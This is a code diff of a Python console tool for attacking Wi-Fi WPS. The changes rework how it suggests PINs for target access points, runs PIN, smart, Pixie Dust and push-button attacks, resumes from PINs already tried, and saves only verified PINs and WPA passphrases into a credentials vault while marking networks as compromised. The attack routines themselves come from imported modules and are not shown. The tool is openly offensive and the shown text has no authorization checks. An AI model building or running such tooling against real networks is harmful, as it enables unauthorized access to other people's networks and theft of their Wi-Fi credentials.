@@ -35,7 +35,7 @@ sys.path.insert(0, str(Path(__file__).parent))
 from config import Config
 from database import Database
 from modules.scanner import scan_iw, get_interface_mode, get_interfaces
-from modules.wps_pins import suggest_pins, is_vulnerable_model
+from modules.wps_pins import classify_model_vulnerability, suggest_pins
 from modules.attack import run_wps_attack, analyze_target, run_smart_attack
 from modules.target_assessment import TargetAssessor
 from modules.monitor_mode import (
@@ -104,6 +104,39 @@ def _get_field(obj, key, default="?"):
         return val if val is not None else default
     except (KeyError, IndexError):
         return default
+
+
+def _credential_fields_for_result(result):
+    """Return only verified PIN/PSK values for a real success result."""
+    if not isinstance(result, dict):
+        return None, None
+    if result.get("status") != "success":
+        return None, None
+    psk = result.get("psk")
+    if not psk:
+        return None, None
+    pin = result.get("pin")
+    if result.get("attempted_pin") == "PBC":
+        pin = None
+    elif not pin:
+        return None, None
+    return pin, psk
+
+
+def _print_attack_result(result):
+    """Display only verified credentials, never attempted PINs."""
+    verified_pin, verified_psk = _credential_fields_for_result(result)
+    if verified_pin:
+        con.print("\n[ok]PIN VERIFIED: {value}[/]".format(value=verified_pin))
+    if verified_psk:
+        con.print("[ok]PSK FOUND: {value}[/]".format(value=verified_psk))
+
+
+def _vulnerability_label(model, device):
+    """Return UI label for exact vulnerability vs vendor heuristic."""
+    classification = classify_model_vulnerability(model, device)
+    return classification
+
 
 def net_table(nets, title="Networks"):
     t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan",
@@ -293,8 +326,19 @@ class App:
 
             for n in networks[:5]:
                 pins = suggest_pins(_get_field(n, "bssid"))[:5]
-                is_vuln, match = is_vulnerable_model(n.get("wps_model",""), n.get("wps_device",""))
-                vuln_tag = f" [ok](VULN: {match})[/]" if is_vuln else ""
+                vulnerability = _vulnerability_label(
+                    n.get("wps_model", ""),
+                    n.get("wps_device", ""),
+                )
+                vuln_tag = ""
+                if vulnerability["status"] == "known_vulnerable":
+                    vuln_tag = " [ok](Known vulnerable: {match})[/]".format(
+                        match=vulnerability["match"]
+                    )
+                elif vulnerability["status"] == "vendor_heuristic":
+                    vuln_tag = " [warn](Vendor heuristic: {match})[/]".format(
+                        match=vulnerability["match"]
+                    )
                 lock_tag = f" [wps_off]LOCKED[/]" if _get_field(n, "wps_locked") == "Yes" else (
                     " [wps_on]OPEN[/]" if _get_field(n, "wps_locked") == "No" else "")
                 con.print(f"  [inf]{n['essid']}[/] ({n['bssid']}){vuln_tag}{lock_tag}")
@@ -809,7 +853,7 @@ class App:
             ll = line.lower()
             if "[+]" in line or "wps pin:" in ll or "wpa psk:" in ll:
                 con.print(f"[ok]{line}[/]")
-            elif "[-]" in line or "locked" in ll or "nack" in ll:
+            elif "[-]" in line or "locked" in ll or "nack" in ll or "m2d" in ll:
                 con.print(f"[warn]{line}[/]")
             elif "[!]" in line or "error" in ll:
                 con.print(f"[err]{line}[/]")
@@ -820,24 +864,55 @@ class App:
             else:
                 con.print(f"[dim]{line}[/]")
 
+        skip_pins = self.db.get_attempted_wps_pins(bssid)
+        if skip_pins:
+            con.print("[dim]Resume database: {count} PINs already tried[/]".format(
+                count=len(skip_pins)
+            ))
+
         if ch == "1":
             con.print(f"\n[hdr]Trying best PIN: {analysis['best_pin']}[/]\n")
-            result = run_wps_attack(iface, "pin", bssid, analysis["best_pin"], output_cb)
+            result = run_wps_attack(
+                iface,
+                "pin",
+                bssid,
+                analysis["best_pin"],
+                output_cb,
+            )
         elif ch == "2":
             con.print("\n[hdr]Smart Attack Sequence[/]\n")
-            result = run_smart_attack(iface, bssid, wps_ver, wps_lock, output_cb)
+            result = run_smart_attack(
+                iface,
+                bssid,
+                wps_ver,
+                wps_lock,
+                output_cb,
+                skip_pins=skip_pins,
+            )
         elif ch == "3":
             pin_idx = IntPrompt.ask("PIN # from list", default=1)
             if 1 <= pin_idx <= len(analysis["pins"]):
                 selected_pin = analysis["pins"][pin_idx-1]["pin"]
                 con.print(f"\n[hdr]Trying: {selected_pin}[/]\n")
-                result = run_wps_attack(iface, "pin", bssid, selected_pin, output_cb)
+                result = run_wps_attack(
+                    iface,
+                    "pin",
+                    bssid,
+                    selected_pin,
+                    output_cb,
+                )
             else:
                 con.print("[err]Invalid selection[/]")
                 Prompt.ask("\n[dim]Enter[/]")
                 return
         else:
-            result = run_wps_attack(iface, "pin", bssid, analysis["best_pin"], output_cb)
+            result = run_wps_attack(
+                iface,
+                "pin",
+                bssid,
+                analysis["best_pin"],
+                output_cb,
+            )
 
         for attempt in result.get("attempts", []):
             self.db.record_wps_attempt(
@@ -849,27 +924,40 @@ class App:
                 session_id=sid,
             )
 
+        verified_pin, verified_psk = _credential_fields_for_result(result)
+
         # Save results
         end_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        self.db.update_session(sid, status=result["status"],
-                              end_time=end_time,
-                              pin_found=result["pin"] or "",
-                              psk_found=result["psk"] or "",
-                              log_path=result["log_file"])
+        self.db.update_session(
+            sid,
+            status=result["status"],
+            end_time=end_time,
+            pin_found=verified_pin or "",
+            psk_found=verified_psk or "",
+            log_path=result["log_file"],
+        )
 
-        if result["pin"]:
-            con.print(f"\n[ok]PIN FOUND: {result['pin']}[/]")
-        if result["psk"]:
-            con.print(f"[ok]PSK FOUND: {result['psk']}[/]")
+        _print_attack_result(result)
 
-        if result["status"] == "success":
+        if result["status"] == "success" and verified_psk:
             self.db.execute("UPDATE networks SET status='compromised' WHERE bssid=?", (bssid,))
-            self.db.add_credential(bssid, essid, result["pin"], result["psk"], "Smart Attack")
-            self.db.log("success", "attack",
-                       f"Credentials: PIN={result['pin']} PSK={result['psk']}", "ok")
+            self.db.add_credential(
+                bssid,
+                essid,
+                verified_pin,
+                verified_psk,
+                "Smart Attack",
+            )
+            self.db.log(
+                "success",
+                "attack",
+                "Credentials: PIN={pin} PSK={psk}".format(
+                    pin=verified_pin or "",
+                    psk=verified_psk,
+                ),
+                "ok",
+            )
             con.print("[ok]CREDENTIALS SAVED![/]")
-        elif result["pin"]:
-            self.db.add_credential(bssid, essid, result["pin"], result["psk"] or "", "Smart Attack")
 
         Prompt.ask("\n[dim]Enter[/]")
 
@@ -989,7 +1077,7 @@ class App:
             except (TypeError, ValueError):
                 signal = 0
 
-            is_vuln, match = is_vulnerable_model(model, device)
+            vulnerability = _vulnerability_label(model, device)
 
             con.print("\n  [hdr]Vulnerability Analysis[/]")
             con.print("  ESSID:  [inf]{essid}[/]".format(essid=essid))
@@ -1017,10 +1105,16 @@ class App:
                 if not Confirm.ask("Continue despite weak signal?", default=False):
                     return
 
-            if is_vuln:
-                con.print("  Status: [ok]Known Vulnerable: {match}[/]".format(
-                    match=match
+            if vulnerability["status"] == "known_vulnerable":
+                con.print("  Status: [ok]Known vulnerable: {match}[/]".format(
+                    match=vulnerability["match"]
                 ))
+            elif vulnerability["status"] == "vendor_heuristic":
+                con.print(
+                    "  Status: [warn]Vendor heuristic — vulnerability not confirmed: {match}[/]".format(
+                        match=vulnerability["match"]
+                    )
+                )
             if pins:
                 con.print("  [ok]Suggested PINs:[/]")
                 for index, pin_info in enumerate(pins[:6], 1):
@@ -1095,7 +1189,7 @@ class App:
             ll = line.lower()
             if "[+]" in line or "wps pin:" in ll or "wpa psk:" in ll:
                 con.print(f"[ok]{line}[/]")
-            elif "[-]" in line or "locked" in ll or "nack" in ll:
+            elif "[-]" in line or "locked" in ll or "nack" in ll or "m2d" in ll:
                 con.print(f"[warn]{line}[/]")
             elif "[!]" in line or "error" in ll:
                 con.print(f"[err]{line}[/]")
@@ -1131,28 +1225,40 @@ class App:
                 session_id=sid,
             )
 
+        verified_pin, verified_psk = _credential_fields_for_result(result)
+
         # Save results
         end_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        self.db.update_session(sid, status=result["status"],
-                              end_time=end_time,
-                              pin_found=result["pin"] or "",
-                              psk_found=result["psk"] or "",
-                              log_path=result["log_file"])
+        self.db.update_session(
+            sid,
+            status=result["status"],
+            end_time=end_time,
+            pin_found=verified_pin or "",
+            psk_found=verified_psk or "",
+            log_path=result["log_file"],
+        )
 
-        if result["pin"]:
-            con.print(f"\n[ok]PIN FOUND: {result['pin']}[/]")
-        if result["psk"]:
-            con.print(f"[ok]PSK FOUND: {result['psk']}[/]")
+        _print_attack_result(result)
 
-        if result["status"] == "success":
+        if result["status"] == "success" and verified_psk:
             self.db.execute("UPDATE networks SET status='compromised' WHERE bssid=?", (bssid,))
-            self.db.add_credential(bssid, essid, result["pin"], result["psk"], aname)
-            self.db.log("success", "attack",
-                       f"Credentials found: PIN={result['pin']} PSK={result['psk']}", "ok")
+            self.db.add_credential(
+                bssid,
+                essid,
+                verified_pin,
+                verified_psk,
+                aname,
+            )
+            self.db.log(
+                "success",
+                "attack",
+                "Credentials found: PIN={pin} PSK={psk}".format(
+                    pin=verified_pin or "",
+                    psk=verified_psk,
+                ),
+                "ok",
+            )
             con.print("[ok]CREDENTIALS SAVED![/]")
-        elif result["pin"]:
-            self.db.add_credential(bssid, essid, result["pin"], result["psk"] or "", aname)
-            con.print("[ok]PIN saved[/]")
 
         Prompt.ask("\n[dim]Enter[/]")
 
@@ -1271,7 +1377,7 @@ class App:
             con.print(Rule("[hdr]Credentials Vault[/]", style="cyan"))
             creds = self.db.get_credentials()
             con.print(f"\n  Stored: [inf]{len(creds)}[/]")
-            con.print("\n  [mn]1[/] View All  [mn]2[/] Search  [mn]0[/] Back\n")
+            con.print("\n  [mn]1[/] View All  [mn]2[/] Search  [mn]3[/] Suspicious WPS Entries  [mn]0[/] Back\n")
 
             ch = Prompt.ask("Select", default="0")
             if ch == "0":
@@ -1301,6 +1407,34 @@ class App:
                     con.print(f"  {c['essid']} PIN:{c['pin']} PSK:{c['psk']}")
                 if not res:
                     con.print("[warn]Not found[/]")
+                Prompt.ask("\n[dim]Enter[/]")
+            elif ch == "3":
+                suspicious = self.db.get_suspicious_wps_credentials()
+                if not suspicious:
+                    con.print("[ok]No suspicious legacy WPS credential rows found.[/]")
+                    Prompt.ask("\n[dim]Enter[/]")
+                    continue
+                t = Table(box=box.ROUNDED, show_header=True, header_style="bold yellow")
+                t.add_column("ID", width=4)
+                t.add_column("ESSID")
+                t.add_column("BSSID", min_width=17)
+                t.add_column("PIN", style="yellow")
+                t.add_column("Method")
+                t.add_column("Time")
+                for row in suspicious:
+                    t.add_row(
+                        str(row["id"]),
+                        row["essid"] or "-",
+                        row["bssid"] or "-",
+                        row["pin"] or "-",
+                        row["method"] or "-",
+                        str(row["captured_at"])[:16],
+                    )
+                con.print(t)
+                con.print("[warn]These rows contain a WPS PIN but no PSK and may be legacy false positives.[/]")
+                if Confirm.ask("Delete all suspicious rows listed above?", default=False):
+                    deleted = self.db.delete_credentials([row["id"] for row in suspicious])
+                    con.print("[ok]Deleted {count} rows[/]".format(count=deleted))
                 Prompt.ask("\n[dim]Enter[/]")
 
     # ═══════════════════════════════════════
@@ -1457,19 +1591,22 @@ class App:
         # Show results
         con.print(f"\n{'='*50}")
         con.print(f"  Status: {result['status']}")
-        if result.get('pin'):
-            con.print(f"  PIN: [ok]{result['pin']}[/]")
-        if result.get('psk'):
-            con.print(f"  PSK: [ok]{result['psk']}[/]")
+        if result.get('attempted_pin'):
+            con.print(f"  Attempted PIN: {result['attempted_pin']}")
+        verified_pin, verified_psk = _credential_fields_for_result(result)
+        if verified_pin:
+            con.print(f"  Verified PIN: [ok]{verified_pin}[/]")
+        if verified_psk:
+            con.print(f"  PSK: [ok]{verified_psk}[/]")
         con.print(f"  Last M: {result.get('last_m', 0)}")
         con.print(f"  Locked: {result.get('is_locked', False)}")
         con.print(f"{'='*50}")
 
         # Save to DB
-        if result['status'] == 'success':
-            self.db.add_credential(bssid, essid, result['pin'], result['psk'], "Direct WPS")
+        if result['status'] == 'success' and verified_psk:
+            self.db.add_credential(bssid, essid, verified_pin, verified_psk, "Direct WPS")
             self.db.execute("UPDATE networks SET status='compromised' WHERE bssid=?", (bssid,))
-            self.db.log("success", "wps_engine", f"PIN: {result['pin']} PSK: {result['psk']}", "ok")
+            self.db.log("success", "wps_engine", f"PIN: {verified_pin} PSK: {verified_psk}", "ok")
 
         Prompt.ask("\n[dim]Enter[/]")
 
@@ -1566,14 +1703,52 @@ class App:
                     r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                     con.print(r.stdout)
                     if r.returncode == 0:
-                        # Extract PIN
+                        # Extract PIN candidate and verify it online before saving.
                         for line in r.stdout.split('\n'):
                             if 'WPS pin' in line and '[+]' in line:
                                 pin = line.split(':')[-1].strip()
                                 if pin and pin != '<empty>':
-                                    con.print(f"\n[ok]PIN FOUND: {pin}[/]")
-                                    self.db.add_credential(bssid, essid, pin, '', 'Pixie Dust')
-                                    self.db.log("success", "pixie", f"PIN: {pin}", "ok")
+                                    con.print(f"\n[warn]PIXIEWPS candidate PIN: {pin}[/]")
+                                    con.print("[dim]Verifying candidate against the AP...[/]")
+                                    verify_engine = None
+                                    try:
+                                        verify_engine = WpsEngine(self.cfg.get("interface", "wlan0"))
+                                        ok, verify_msg = verify_engine.start()
+                                        if not ok:
+                                            con.print(f"[err]Verification engine failed: {verify_msg}[/]")
+                                            continue
+                                        verify_result = verify_engine.wps_pin_attack(bssid, pin, timeout=45)
+                                    except Exception as exc:
+                                        con.print(f"[err]Verification error: {exc}[/]")
+                                        verify_result = {"status": "error"}
+                                    finally:
+                                        try:
+                                            verify_engine.stop()
+                                        except Exception:
+                                            pass
+
+                                    verified_pin, verified_psk = _credential_fields_for_result(verify_result)
+                                    if verify_result.get("status") == "success" and verified_psk:
+                                        con.print(f"\n[ok]PIN VERIFIED: {verified_pin}[/]")
+                                        con.print(f"[ok]PSK FOUND: {verified_psk}[/]")
+                                        self.db.add_credential(
+                                            bssid,
+                                            essid,
+                                            verified_pin,
+                                            verified_psk,
+                                            'Pixie Dust',
+                                        )
+                                        self.db.log(
+                                            "success",
+                                            "pixie",
+                                            "PIN={pin} PSK={psk}".format(
+                                                pin=verified_pin,
+                                                psk=verified_psk,
+                                            ),
+                                            "ok",
+                                        )
+                                    else:
+                                        con.print("[warn]Candidate PIN was not verified; nothing was saved.[/]")
                 except Exception as e:
                     con.print(f"[err]pixiewps error: {e}[/]")
             else:
@@ -1626,8 +1801,11 @@ class App:
             engine.stop()
 
         con.print(f"\n  Status: {result.get('status')}")
-        if result.get('psk'):
-            con.print(f"  PSK: [ok]{result['psk']}[/]")
+        verified_pin, verified_psk = _credential_fields_for_result(result)
+        if verified_psk:
+            con.print(f"  PSK: [ok]{verified_psk}[/]")
+            self.db.add_credential(bssid or "", "", verified_pin, verified_psk, "Direct WPS PBC")
+            self.db.log("success", "wps_engine", f"PBC PSK: {verified_psk}", "ok")
 
         Prompt.ask("\n[dim]Enter[/]")
 
